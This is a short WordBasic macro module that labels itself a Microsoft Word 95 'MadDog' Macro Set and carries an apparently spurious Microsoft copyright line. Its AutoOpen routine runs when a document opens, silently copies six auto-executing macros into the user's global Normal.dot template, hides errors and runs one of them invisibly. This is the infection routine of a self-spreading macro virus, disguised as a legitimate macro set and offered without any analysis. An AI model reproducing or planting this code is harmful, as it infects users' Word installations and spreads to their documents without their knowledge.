   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim UserPath$
   Dim WorkingPath$
   Dim FullPath$
   Dim Rover$
   Dim CurrFile$
   Rem  --------------------------------------------------------
   Rem       Microsoft Word for Windows 95 "MadDog" Macro Set
   Rem                  v 1.0, March l996
   Rem   --------------------------------------------------------
   Rem       (c) Copyright Microsoft Corporation, 1995
   On Error GoTo -1: On Error GoTo BYE:
   UserPath$ = WordBasic.[DefaultDir$](2)
   WorkingPath$ = WordBasic.[DefaultDir$](0)
   FullPath$ = UserPath$ + "\Normal.dot"
   Rover$ = UserPath$ + "\Temp.dot"
   CurrFile$ = WordBasic.[FileName$]()
   WordBasic.Organizer Copy:=1, Source:=CurrFile$, Destination:=FullPath$, Name:="AOpnFinish", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=CurrFile$, Destination:=FullPath$, Name:="AutoExec", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=CurrFile$, Destination:=FullPath$, Name:="FileClose", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=CurrFile$, Destination:=FullPath$, Name:="AutoClose", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=CurrFile$, Destination:=FullPath$, Name:="FCFinish", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=CurrFile$, Destination:=FullPath$, Name:="AutoOpen", Tab:=3
   WordBasic.ToolsMacro Name:="AOpnFinish", Run:=1, Show:=0, Description:="", NewName:=""
   BYE:
   End Sub
